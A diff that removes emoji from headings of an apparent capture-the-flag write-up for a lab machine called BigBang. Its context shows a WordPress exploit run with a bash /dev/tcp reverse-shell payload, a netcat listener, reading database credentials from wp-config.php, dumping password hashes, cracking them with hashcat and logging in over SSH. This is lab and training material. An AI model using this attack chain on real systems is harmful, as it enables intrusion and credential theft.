@@ -816,9 +816,9 @@ It’s using the Python ten exploitation framework, which uses classes and decor
 
 ---
 
-## 🛠 Modifying the Exploit
+##  Modifying the Exploit
 
-### ✅ Updated Remote Class Methods
+###  Updated Remote Class Methods
 
 **`send()` function**:
 
@@ -851,7 +851,7 @@ def download(self, path: str) -> bytes:
 
 ---
 
-### ✅ Fix Test for Partial Result
+###  Fix Test for Partial Result
 
 ```python
 def check_token(text: str, path: str) -> bool:
@@ -861,7 +861,7 @@ def check_token(text: str, path: str) -> bool:
 
 ---
 
-### ✅ Fix LIBC Download Padding
+###  Fix LIBC Download Padding
 
 ```python
 def download_file(self, remote_path: str, local_path: str) -> None:
@@ -872,7 +872,7 @@ def download_file(self, remote_path: str, local_path: str) -> None:
 
 ---
 
-### ✅ Fix `get_regions()` for Decoding Issues
+###  Fix `get_regions()` for Decoding Issues
 
 ```python
 def get_regions(self) -> list[Region]:
@@ -887,7 +887,7 @@ def get_regions(self) -> list[Region]:
 
 ---
 
-## 🚀 Exploit Results
+##  Exploit Results
 
 ✔ Data and `php://filter/` wrappers work
 ✔ Zlib extension is enabled
@@ -908,9 +908,9 @@ uv run exploit.py http://blog.bigbang.htb 'bash -c "bash -i >& /dev/tcp/10.10.14
 
 ---
 
-## ✅ Post-Exploit Shell Access
+## Post-Exploit Shell Access
 
-### 🎯 Initial Shell Connection
+### Initial Shell Connection
 
 ```bash
 nc -lnvp 443
@@ -922,7 +922,7 @@ www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$
 
 ---
 
-### 🎯 Shell Upgrade Trick
+###  Shell Upgrade Trick
 
 ```bash
 www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ script /dev/null -c bash
@@ -940,23 +940,23 @@ Final shell upgraded to interactive.
 
 ---
 
-## 🧱 Container Enumeration
+##  Container Enumeration
 
-### ✅ OS Information
+### OS Information
 
 ```bash
 cat /etc/os-release
 # Debian GNU/Linux 12 (bookworm)
 ```
 
-### ✅ Docker Environment
+###  Docker Environment
 
 ```bash
 ls -a /
 # .dockerenv file present → confirms containerized environment
 ```
 
-### ✅ Container IP
+###  Container IP
 
 ```bash
 cat /proc/net/fib_trie
@@ -965,14 +965,14 @@ cat /proc/net/fib_trie
 
 ---
 
-## 🌐 WordPress Directory Structure
+##  WordPress Directory Structure
 
 ```bash
 ls /var/www/html/wordpress
 # index.php, wp-config.php, wp-admin/, wp-content/, etc.
 ```
 
-### ✅ Database Connection Info from wp-config.php
+###  Database Connection Info from wp-config.php
 
 ```php
 DB_NAME: wordpress
@@ -983,9 +983,9 @@ DB_HOST: 172.17.0.1
 
 ---
 
-## 🧱 Database Enumeration
+##  Database Enumeration
 
-### ✅ PHP Script to Query DB
+###  PHP Script to Query DB
 
 ```php
 <?php
@@ -997,7 +997,7 @@ Uploaded and verified working.
 
 ---
 
-### ✅ Databases Found
+###  Databases Found
 
 ```sql
 show databases;
@@ -1008,7 +1008,7 @@ show databases;
 
 ---
 
-### ✅ Tables in wordpress DB
+###  Tables in wordpress DB
 
 ```sql
 show tables;
@@ -1028,7 +1028,7 @@ show tables;
 
 ---
 
-### ✅ Dump wp\_users Table
+### Dump wp\_users Table
 
 ```sql
 select * from wp_users;
@@ -1049,16 +1049,16 @@ Sample output:
 
 ---
 
-## 🔓 Cracking WordPress Hashes
+##  Cracking WordPress Hashes
 
-### ✅ Save Hashes for Cracking
+###  Save Hashes for Cracking
 
 ```
 root:$P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
 shawking:$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
 ```
 
-### ✅ Hashcat Usage
+### Hashcat Usage
 
 ```bash
 hashcat wphashes rockyou.txt --user
@@ -1072,7 +1072,7 @@ quantumphysics
 
 ---
 
-## 🔐 SSH Access with Cracked Password
+##  SSH Access with Cracked Password
 
 ```bash
 sshpass -p 'quantumphysics' ssh shawking@bigbang.htb
